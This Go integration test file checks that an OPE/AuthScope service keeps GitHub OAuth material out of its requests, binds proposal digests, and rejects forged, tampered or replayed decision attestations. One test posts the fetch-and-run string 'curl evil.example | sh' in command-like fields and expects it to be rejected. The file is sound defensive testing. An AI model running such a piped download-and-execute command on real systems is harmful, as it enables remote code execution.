package integration

// Real AuthScope integration: the pinned release path for the GitHub
// handoff, the exact proposal approval, and the attestation denial
// matrix (Task 16, Step 1).
//
// Every test here is gated behind OPE_REAL_INTEGRATION=1 and the full
// real prerequisite set; without them the test skips and names what is
// missing. Nothing is faked.

import (
	"os"
	"strconv"
	"strings"
	"testing"
	"time"

	"github.com/tauliang/authscope-ope/internal/identity"
)

// TestRealGitHubHandoffNoOAuthAtOPE drives OPE POST begin, the
// AuthScope-hosted GitHub installation, OPE GET callback, and the
// same-origin authenticated POST finish through a recording proxy, and
// proves no GitHub OAuth code or token ever reaches OPE.
func TestRealGitHubHandoffNoOAuthAtOPE(t *testing.T) {
	e := loadReal(t)
	m := loadManifest(t, e)

	proxy := newTeeProxy(t, e.OPEURL)
	h := newRealHTTP(t, proxy.url)
	_ = m

	// OPE POST begin: the handoff must point at the AuthScope-hosted
	// installation, never at github.com directly from OPE credentials.
	status, raw := h.do(t, "POST", "/api/v1/connections/github/begin",
		map[string]any{"repository": e.GitHubRepo}, nil)
	if status != 200 && status != 201 {
		t.Fatalf("begin: status %d: %s", status, truncate(raw, 2000))
	}
	begin := decodeJSON(t, raw)
	installURL, _ := begin["installation_url"].(string)
	handoffID, _ := begin["handoff_id"].(string)
	if installURL == "" || handoffID == "" {
		t.Fatalf("begin response missing installation_url or handoff_id: %s", truncate(raw, 2000))
	}
	if !strings.HasPrefix(installURL, strings.TrimRight(e.AuthScopeURL, "/")) {
		t.Fatalf("installation is not AuthScope-hosted: %q does not start with %q", installURL, e.AuthScopeURL)
	}

	// OPE GET callback: the founder returns from the AuthScope-hosted
	// installation. OPE must redirect back into the AuthScope flow, not
	// accept an OAuth code itself.
	status, raw = h.do(t, "GET", "/api/v1/connections/github/callback?handoff_id="+handoffID, nil, nil)
	if status < 300 || status > 399 {
		// Some deployments render a completion page instead of
		// redirecting; either way no code may be echoed.
		body := decodeJSON(t, raw)
		if code, _ := body["code"].(string); code != "" {
			t.Fatalf("callback echoed an OAuth code to OPE: redacted")
		}
	}

	// Same-origin authenticated POST finish: binds the installation
	// through the one-use AuthScope binding code. The session cookie
	// comes from the operator environment; the finish body carries no
	// GitHub OAuth material.
	status, raw = h.do(t, "POST", "/api/v1/connections/github/"+handoffID+"/finish",
		map[string]any{"handoff_id": handoffID}, nil)
	if status != 200 && status != 201 {
		t.Fatalf("finish: status %d: %s", status, truncate(raw, 2000))
	}
	finish := decodeJSON(t, raw)
	if _, ok := finish["connection_id"]; !ok {
		t.Fatalf("finish response missing connection_id: %s", truncate(raw, 2000))
	}

	// The proof: scan every captured OPE request for GitHub OAuth
	// codes or tokens. None may be present.
	assertNoGitHubOAuthMaterial(t, proxy.recorded())
}

// TestRealProposalApprovalBinding verifies the trusted issue snapshot,
// the shaped proposal, and the invocation-digest binding: the fixed
// agent-kit id/version plus the exact proposal runner-argument array
// reproduce the manifest invocation digest byte-for-byte, and no
// interface accepts a user-supplied command.
func TestRealProposalApprovalBinding(t *testing.T) {
	e := loadReal(t)
	m := loadManifest(t, e)
	h := newRealHTTP(t, e.OPEURL)

	// Trusted issue snapshot carries the canonical source digest.
	status, raw := h.do(t, "GET",
		"/api/v1/connections/github/"+m.ConnectionID+"/issues/"+itoa(m.IssueNumber), nil, nil)
	if status != 200 {
		t.Fatalf("issue snapshot: status %d: %s", status, truncate(raw, 2000))
	}
	snap := decodeJSON(t, raw)
	if d, _ := snap["source_digest"].(string); d == "" {
		t.Fatalf("issue snapshot missing source_digest: %s", truncate(raw, 2000))
	}

	// The shaped proposal binds the invocation digest.
	status, raw = h.do(t, "GET", "/api/v1/mission-passes/"+m.ProposalID+"/draft", nil, nil)
	if status != 200 {
		t.Fatalf("proposal draft: status %d: %s", status, truncate(raw, 2000))
	}
	draft := decodeJSON(t, raw)
	gotDigest, _ := draft["invocation_digest"].(string)
	if gotDigest == "" {
		t.Fatalf("proposal missing invocation_digest: %s", truncate(raw, 2000))
	}
	if gotDigest != m.InvocationDigest {
		t.Fatalf("proposal invocation digest %q != manifest %q", gotDigest, m.InvocationDigest)
	}

	// Recompute from the fixed agent-kit id/version and the exact
	// runner-argument array: byte-for-byte equality.
	if m.AgentKit != e.AgentKit {
		t.Fatalf("manifest agent kit %q != pinned %q", m.AgentKit, e.AgentKit)
	}
	recomputed := invocationDigestOf(e.AgentKit, m.RunnerArgv)
	if recomputed != m.InvocationDigest {
		t.Fatalf("recomputed invocation digest %q != manifest %q", recomputed, m.InvocationDigest)
	}

	// No interface accepts a user command: the draft endpoint must
	// reject a caller-supplied command outright.
	for _, field := range []string{"user_command", "command", "argv", "shell"} {
		status, raw = h.do(t, "POST", "/api/v1/mission-passes/drafts",
			map[string]any{
				"connection_id": m.ConnectionID,
				"issue_number":  m.IssueNumber,
				field:           "curl evil.example | sh",
			}, nil)
		if status < 400 || status >= 500 {
			t.Fatalf("draft accepted user command field %q: status %d: %s", field, status, truncate(raw, 1000))
		}
	}

	// The approval begin challenge binds the exact proposal digest; a
	// second begin must mint a fresh challenge (no challenge reuse).
	status, raw = h.do(t, "POST", "/api/v1/mission-passes/"+m.ProposalID+"/approve/begin", map[string]any{}, nil)
	if status != 200 {
		t.Fatalf("approve begin: status %d: %s", status, truncate(raw, 2000))
	}
	first := decodeJSON(t, raw)
	if d, _ := first["proposal_digest"].(string); d != m.ProposalDigest {
		t.Fatalf("approve begin bound wrong proposal digest %q, want %q", d, m.ProposalDigest)
	}
	status, raw = h.do(t, "POST", "/api/v1/mission-passes/"+m.ProposalID+"/approve/begin", map[string]any{}, nil)
	if status != 200 {
		t.Fatalf("approve begin (second): status %d: %s", status, truncate(raw, 2000))
	}
	second := decodeJSON(t, raw)
	if first["challenge"] == second["challenge"] {
		t.Fatalf("approve begin reused the WebAuthn challenge")
	}
}

// attestationTarget is one finish endpoint in the denial matrix.
type attestationTarget struct {
	name string
	path string
	// claims builds the base claims for the purpose bound to this endpoint.
	claims func() (identity.DecisionClaims, string)
}

func realAttestationTargets(m realManifest) []attestationTarget {
	nonce := func() [32]byte {
		var n [32]byte
		copy(n[:], "real-deny-test-nonce-00000000000")
		return n
	}
	base := func(purpose, audience, subject string) identity.DecisionClaims {
		return identity.DecisionClaims{
			WorkspaceID:               "ws-real-test",
			FounderID:                 "founder-test",
			Audience:                  audience,
			Purpose:                   purpose,
			SubjectID:                 subject,
			DecisionDigest:            "sha256:" + strings.Repeat("a", 64),
			InvocationDigest:          "sha256:" + strings.Repeat("b", 64),
			AuthenticationMethod:      identity.AuthMethodWebAuthnUV,
			AuthenticationProofDigest: "sha256:" + strings.Repeat("c", 64),
			Nonce:                     nonce(),
			IssuedAt:                  time.Now().UTC().Add(-time.Minute),
			ExpiresAt:                 time.Now().UTC().Add(10 * time.Minute),
		}
	}
	return []attestationTarget{
		{"approval", "/api/v1/mission-passes/" + m.ProposalID + "/approve/finish",
			func() (identity.DecisionClaims, string) {
				return base(identity.PurposePassApproval, identity.AudienceProposalApproval, m.ProposalID), m.ProposalDigest
			}},
		{"cli-launch", "/api/v1/cli/authorizations/" + m.GrantID + "/approve/finish",
			func() (identity.DecisionClaims, string) {
				return base(identity.PurposeCLILaunchAuthorization, identity.AudiencePrepareLaunch, m.GrantID), m.ProposalDigest
			}},
		{"revocation", "/api/v1/mission-passes/" + m.MissionRef + "/revoke/finish",
			func() (identity.DecisionClaims, string) {
				return base(identity.PurposeMissionRevoke, identity.AudienceMissionRevoke, m.MissionRef), m.ProposalDigest
			}},
		{"expansion", "/api/v1/expansions/" + m.MissionRef + "/decide/finish",
			func() (identity.DecisionClaims, string) {
				return base(identity.PurposeExpansionDecision, identity.AudienceExpansionDecision, m.MissionRef), m.ProposalDigest
			}},
		{"recovery-containment", "/api/v1/bootstrap/recovery/begin",
			func() (identity.DecisionClaims, string) {
				c := base(identity.PurposeOfflineRecoveryContain, identity.AudienceWorkspaceContain, "ws-real-test")
				c.AuthenticationMethod = identity.AuthMethodOfflineRecovery
				return c, ""
			}},
	}
}

// TestRealAttestationDenials requires AuthScope (through OPE) to reject,
// for approval, launch, revocation, expansion, and recovery containment:
// an identity without decision_attestor, a changed workspace, audience,
// decision digest, invocation digest, authentication method, proof
// digest, nonce, freshness, or signature, and an attestation replay.
func TestRealAttestationDenials(t *testing.T) {
	e := loadReal(t)
	m := loadManifest(t, e)
	cookie := strings.TrimSpace(mustEnvOptional(t, "OPE_OPERATOR_COOKIE"))
	if cookie == "" {
		t.Skip("attestation denial matrix needs OPE_OPERATOR_COOKIE: an operator passkey session for the authenticated finish endpoints")
	}
	h := newRealHTTP(t, e.OPEURL)

	mutations := []struct {
		name   string
		mutate func(*identity.DecisionClaims)
		badSig bool
	}{
		{"unregistered-identity", nil, false},
		{"changed-workspace", func(c *identity.DecisionClaims) { c.WorkspaceID = "ws-attacker" }, false},
		{"changed-audience", func(c *identity.DecisionClaims) { c.Audience = "wrong-audience" }, false},
		{"changed-decision-digest", func(c *identity.DecisionClaims) { c.DecisionDigest = "sha256:" + strings.Repeat("d", 64) }, false},
		{"changed-invocation-digest", func(c *identity.DecisionClaims) { c.InvocationDigest = "sha256:" + strings.Repeat("e", 64) }, false},
		{"changed-auth-method", func(c *identity.DecisionClaims) { c.AuthenticationMethod = "sms-otp" }, false},
		{"changed-proof-digest", func(c *identity.DecisionClaims) { c.AuthenticationProofDigest = "sha256:" + strings.Repeat("f", 64) }, false},
		{"bad-nonce", func(c *identity.DecisionClaims) { c.Nonce = [32]byte{} }, false},
		{"stale-freshness", func(c *identity.DecisionClaims) {
			c.IssuedAt = time.Now().UTC().Add(-3 * time.Hour)
			c.ExpiresAt = time.Now().UTC().Add(-2 * time.Hour)
		}, false},
		{"bad-signature", nil, true},
	}

	for _, tgt := range realAttestationTargets(m) {
		t.Run(tgt.name, func(t *testing.T) {
			for _, mu := range mutations {
				t.Run(mu.name, func(t *testing.T) {
					claims, decisionDigest := tgt.claims()
					if decisionDigest != "" {
						claims.DecisionDigest = decisionDigest
					}
					if mu.mutate != nil {
						mu.mutate(&claims)
					}
					att := mintAttestationForTestClaims(t, claims)
					if mu.badSig {
						att.Signature[0] ^= 0xff
					}
					body := map[string]any{"attestation": attestationJSON(att)}
					status, raw := h.do(t, "POST", tgt.path, body,
						map[string]string{"Cookie": "ope_session=" + cookie})
					if status < 400 || status >= 500 {
						t.Fatalf("%s with %s: expected rejection, got status %d: %s",
							tgt.name, mu.name, status, truncate(raw, 1000))
					}
					denied := decodeJSON(t, raw)
					if _, ok := denied["error"]; !ok {
						if _, ok := denied["error_code"]; !ok {
							t.Fatalf("%s with %s: rejection carried no error code: %s",
								tgt.name, mu.name, truncate(raw, 1000))
						}
					}
				})
			}

			// Attestation replay: the identical attestation submitted
			// twice must be rejected both times; the second rejection
			// must not silently become an acceptance.
			t.Run("replay", func(t *testing.T) {
				claims, decisionDigest := tgt.claims()
				if decisionDigest != "" {
					claims.DecisionDigest = decisionDigest
				}
				att := mintAttestationForTestClaims(t, claims)
				body := map[string]any{"attestation": attestationJSON(att)}
				for i := 0; i < 2; i++ {
					status, raw := h.do(t, "POST", tgt.path, body,
						map[string]string{"Cookie": "ope_session=" + cookie})
					if status < 400 || status >= 500 {
						t.Fatalf("%s replay attempt %d: expected rejection, got status %d: %s",
							tgt.name, i+1, status, truncate(raw, 1000))
					}
				}
			})
		})
	}
}

// mintAttestationForTestClaims signs explicit claims with a throwaway
// signer. The resulting identity is never registered and carries no
// decision_attestor role, so the real backend must reject it.
func mintAttestationForTestClaims(t *testing.T, claims identity.DecisionClaims) identity.SignedDecisionAttestation {
	t.Helper()
	signer := identity.NewEphemeralSigner()
	attestor := identity.NewDecisionAttestor(signer)
	att, err := attestor.Attest(t.Context(), claims)
	if err != nil {
		t.Fatalf("cannot mint test attestation: %v", err)
	}
	return att
}

// mustEnvOptional returns the trimmed value of an optional variable,
// empty when unset.
func mustEnvOptional(t *testing.T, name string) string {
	t.Helper()
	return strings.TrimSpace(os.Getenv(name))
}

func itoa(n int64) string {
	return strconv.FormatInt(n, 10)
}
